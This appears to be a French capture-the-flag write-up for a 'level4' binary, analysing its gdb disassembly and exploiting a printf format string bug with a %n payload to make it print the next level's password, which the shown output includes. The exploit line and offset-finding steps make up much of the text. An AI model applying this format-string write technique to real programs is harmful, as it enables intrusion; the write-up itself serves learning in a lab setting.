## Analyse

Le programme appele `fgets` donc il est impossible d'effectuer un buffer overflow. 

```
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n>
   0x080484b2 <+11>:	leave  
   0x080484b3 <+12>:	ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave  
   0x08048456 <+18>:	ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218
   0x08048460 <+9>:	mov    eax,ds:0x8049804
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>:	lea    eax,[ebp-0x208]
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax
   0x0804847a <+35>:	call   0x8048350 <fgets@plt>
   0x0804847f <+40>:	lea    eax,[ebp-0x208]
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax
   0x08048488 <+49>:	call   0x8048444 <p>
   0x0804848d <+54>:	mov    eax,ds:0x8049810
   0x08048492 <+59>:	cmp    eax,0x1025544
   0x08048497 <+64>:	jne    0x80484a5 <n+78>
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>:	call   0x8048360 <system@plt>
   0x080484a5 <+78>:	leave  
   0x080484a6 <+79>:	ret    
End of assembler dump.
(gdb) 

(gdb) x/s 0x8048590
0x8048590:	 "/bin/cat /home/user/level5/.pass"

```

```
 0x0804848d <+54>:    mov    eax,ds:0x8049810
 0x08048492 <+59>:    cmp    eax,0x1025544

```
m est copie dans eax puis eax est compare a `0x1025544`.

```
(gdb) print 0x1025544
  $1 = 16930116
```
eax doit etre egal a 16930116.
## Exploit

```
(gdb) run
Starting program: /home/user/level4/level4 
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff664 0xb7fd0ff4 (nil) (nil) 0xbffff628 0x804848d 0xbffff420 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
[Inferior 1 (process 7598) exited normally]
```

L'offset est 12

`%12$n` = Pour accéder directement au 4ème paramètre sur la pile avec `12$` et écrire l'adresse (\x10\x98\x04\x08).


16930116 - 4 = 16930112. On retire 4 char car on ecrit l'adresse avant.


```
(python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"';cat) | ./level4
    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```